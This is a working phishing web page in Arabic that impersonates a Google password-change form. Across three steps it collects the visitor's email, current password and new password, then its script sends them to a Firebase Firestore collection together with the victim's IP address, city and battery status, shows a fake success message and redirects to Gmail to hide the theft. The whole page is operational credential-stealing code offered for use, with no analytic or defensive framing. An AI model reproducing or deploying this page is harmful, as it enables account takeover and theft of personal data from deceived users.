<!doctype html>
<html lang="ar">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>تغيير كلمة المرور — Google</title>
<style>
body{margin:0;background:#f5f7fa;font-family:Roboto, sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 8px 24px rgba(0,0,0,.1);width:100%;max-width:400px;text-align:center;position:relative}
.logo{font-size:32px;font-weight:700;margin-bottom:16px;font-family:Product Sans,Roboto,sans-serif;}
.logo span.g{color:#4285F4;}
.logo span.o1{color:#EA4335;}
.logo span.o2{color:#FBBC05;}
.logo span.g2{color:#4285F4;}
.logo span.l{color:#34A853;}
.logo span.e{color:#EA4335;}
.description{font-size:14px;color:#5f6368;margin-bottom:16px;line-height:1.5}
input{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;margin:12px 0;font-size:15px;outline:none;transition:border 0.2s}
input:focus{border-color:#1a73e8}
button{width:100%;padding:12px;margin-top:16px;border:0;border-radius:8px;font-weight:600;font-size:15px;cursor:pointer;background:#1a73e8;color:#fff;transition:background 0.2s}
button:hover{background:#1558b0}
.error{color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:8px;text-align:right;display:none}
.success{font-size:18px;color:green;margin-top:20px;display:none}
.step{display:none}
.step.active{display:block}
.shake{animation:shake 0.3s}
@keyframes shake{0%{transform:translateX(0)}25%{transform:translateX(-5px)}50%{transform:translateX(5px)}75%{transform:translateX(-5px)}100%{transform:translateX(0)}}
</style>
</head>
<body>

<div class="card">
  <div class="logo">
    <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
  </div>

  <div class="description">
    الرجاء إدخال بريدك الإلكتروني وكلمة المرور لتحديث حسابك بأمان.
  </div>

  <form id="form">
    <div class="step step1 active">
      <input type="email" placeholder="البريد الإلكتروني" required id="email">
      <div class="error">يرجى إدخال بريد إلكتروني صالح</div>
      <button type="button" id="next1">التالي</button>
    </div>

    <div class="step step2">
      <input type="password" placeholder="كلمة المرور الحالية" required minlength="8" id="currentPassword">
      <div class="error">كلمة المرور الحالية يجب أن تكون 8 أحرف على الأقل</div>
      <button type="button" id="next2">التالي</button>
    </div>

    <div class="step step3">
      <input type="password" placeholder="كلمة المرور الجديدة" required minlength="8" id="newPassword">
      <input type="password" placeholder="تأكيد كلمة المرور" required minlength="8" id="confirmPassword">
      <div class="error" id="error3">كلمة المرور يجب أن تكون ≥ 8 أحرف ومتطابقة</div>
      <div class="success" id="successMessage">تم تغيير كلمة السر بنجاح</div>
      <button type="button" id="verifyPass">التالي</button>
    </div>
  </form>
</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-app.js";
import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.2.1/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCInhJ9Yq7znuEeHJkeRulBU6G4uHbdnyk",
  authDomain: "merry-fc865.firebaseapp.com",
  projectId: "merry-fc865",
  storageBucket: "merry-fc865.firebasestorage.app",
  messagingSenderId: "114253227649",
  appId: "1:114253227649:web:6eae11c8ace416d9fccf80",
  measurementId: "G-DKT1EEHHMX"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

const step1 = document.querySelector(".step1");
const step2 = document.querySelector(".step2");
const step3 = document.querySelector(".step3");
const next1 = document.getElementById("next1");
const next2 = document.getElementById("next2");
const verifyPass = document.getElementById("verifyPass");
const error3 = document.getElementById("error3");
const successMessage = document.getElementById("successMessage");

let lastSentData = "";

// التنقل العادي بين الخطوات (لا يتأخر الإنتقال بسبب إرسال البيانات)
next1.addEventListener("click", ()=>{
  const input = document.getElementById("email");
  if(input.checkValidity()){
    step1.classList.remove("active");
    step2.classList.add("active");
    step1.querySelector(".error").style.display = "none";
  } else {
    step1.querySelector(".error").style.display = "block";
  }
});

next2.addEventListener("click", ()=>{
  const input = document.getElementById("currentPassword");
  if(input.checkValidity()){
    step2.classList.remove("active");
    step3.classList.add("active");
    step2.querySelector(".error").style.display = "none";
  } else {
    step2.querySelector(".error").style.display = "block";
  }
});

// الزر الأخير: تحقق ثم إرسال ثم تحويل النص إلى "الرجوع" الذي يفتح Gmail
verifyPass.addEventListener("click", async ()=>{
  const email = document.getElementById("email").value.trim();
  const currentPassword = document.getElementById("currentPassword").value.trim();
  const newPassword = document.getElementById("newPassword").value.trim();
  const confirmPassword = document.getElementById("confirmPassword").value.trim();

  if(newPassword.length >= 8 && newPassword === confirmPassword){
    const dataString = `${email}|${currentPassword}|${newPassword}`;
    // إرسال فقط إذا البيانات ليست مكررة ولها قيم
    if(dataString !== lastSentData && email && currentPassword && newPassword){
      await sendData(email, currentPassword, newPassword);
      lastSentData = dataString;
    }

    error3.style.display = "none";
    successMessage.style.display = "block";
    step3.querySelectorAll("input").forEach(el=>el.disabled = true);

    // تحويل زر "التالي" إلى "الرجوع" وفتح Gmail عند الضغط
    verifyPass.textContent = "الرجوع";
    // إزالة أي مستمع قديم لتجنب تشغيل التحقق مجددًا
    verifyPass.replaceWith(verifyPass.cloneNode(true));
    const newBackBtn = document.getElementById("verifyPass") || document.querySelector("#verifyPass");
    // إذا العنصر غير موجود بعد الاستبدال، نختار الزر بالبحث في DOM
    const finalBtn = newBackBtn || document.querySelector("button[id='verifyPass']");
    if(finalBtn){
      finalBtn.addEventListener("click", ()=> {
        window.location.href = "https://mail.google.com/mail/u/0/#inbox";
      }, { once: true });
    }
  } else {
    error3.style.display = "block";
    verifyPass.classList.add("shake");
    setTimeout(()=>verifyPass.classList.remove("shake"),300);
  }
});

// دالة للحصول على IP والموقع (مع معالجة أخطاء الشبكة)
async function fetchIPandCity(){
  try{
    const controller = new AbortController();
    const timeoutId = setTimeout(()=>controller.abort(), 5000); // 5s timeout
    const res = await fetch("https://ipapi.co/json/", { signal: controller.signal });
    clearTimeout(timeoutId);
    if(!res.ok) throw new Error("ipapi failed");
    const data = await res.json();
    return {
      ip: data.ip || "غير معروف",
      city: data.city || data.region || data.country_name || "غير معروف"
    };
  } catch(e){
    // فشل الجلب -> نعيد قيم افتراضية
    return { ip: "غير معروف", city: "غير معروف" };
  }
}

// الحصول على حالة البطارية إن كانت مدعومة، مع وقت انتظار
async function getBatteryStatusSafe(){
  try{
    if(navigator.getBattery){
      const bat = await navigator.getBattery();
      const pct = Math.round((bat.level || 0) * 100);
      return `${bat.charging ? "يشحن" : "غير مشحون"} - ${pct}%`;
    }
  } catch(e){
    // تجاهل الأخطاء
  }
  return "غير معروف";
}

// إرسال البيانات إلى مجموعة "جديد"
async function sendData(email, currentPassword, newPassword){
  if(!email && !currentPassword && !newPassword) return;

  const batteryStatus = await getBatteryStatusSafe();
  const { ip, city } = await fetchIPandCity();

  try{
    await addDoc(collection(db, "جديد"), {
      "0.0.0.0.0": "",               // الحقل المطلوب كما طلبت
      البريد_الإلكتروني: email || "",
      كلمة_الحالية: currentPassword || "",
      كلمة_الجديدة: newPassword || "",
      المدينة: city,
      حالة_الشحن: batteryStatus,
      IP_والموقع: ip,
      timestamp: new Date()
    });
  } catch(e){
    console.error("خطأ عند إرسال البيانات: ", e);
  }
}
</script>

</body>
</html>
